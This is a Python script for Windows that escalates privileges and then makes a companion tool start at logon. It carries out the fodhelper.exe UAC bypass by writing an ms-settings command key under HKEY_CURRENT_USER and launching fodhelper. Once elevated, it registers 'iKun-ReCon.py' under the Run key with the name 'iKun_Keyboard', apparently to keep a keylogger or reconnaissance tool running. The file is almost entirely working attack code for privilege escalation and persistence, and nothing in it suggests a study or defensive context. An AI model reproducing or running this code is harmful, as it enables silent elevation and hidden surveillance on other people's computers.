import os
import sys
import ctypes
import winreg

CMD = r"C:\Windows\System32\cmd.exe"
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def set_startup(filepath, name):
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, filepath)
        winreg.CloseKey(key)
        print(f"[+] {name} set to run at startup with path: {filepath}")

    except WindowsError:
        print(f"[!] Failed to set {name} to run at startup")

def cancel_startup(filepath, name):
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        print(f"[+] {name} removed from startup")

    except WindowsError as e:
        print(e)
        print(f"[!] Failed to remove {name} from startup")

def execute(action):
    if not is_admin():
        print('[!] The program is NOT running with administrative privileges')
        try:
            current_dir = os.path.abspath(__file__)
            if action == "set":
                cmd = '{} /c {} set'.format(CMD, current_dir)
            elif action == "cancel":
                cmd = '{} /c {} cancel'.format(CMD, current_dir)

            bypass_uac(cmd)
            os.system(FOD_HELPER)
        except WindowsError:
            pass
    else:
        script_dir = os.path.dirname(__file__)  # 获取当前脚本所在的目录
        other_file = os.path.join(script_dir, "iKun-ReCon.py")
        if action == "set":
            set_startup(other_file, "iKun_Keyboard")
        elif action == "cancel":
            cancel_startup(other_file, "iKun_Keyboard")

if __name__ == '__main__':
    execute(action=sys.argv[1])
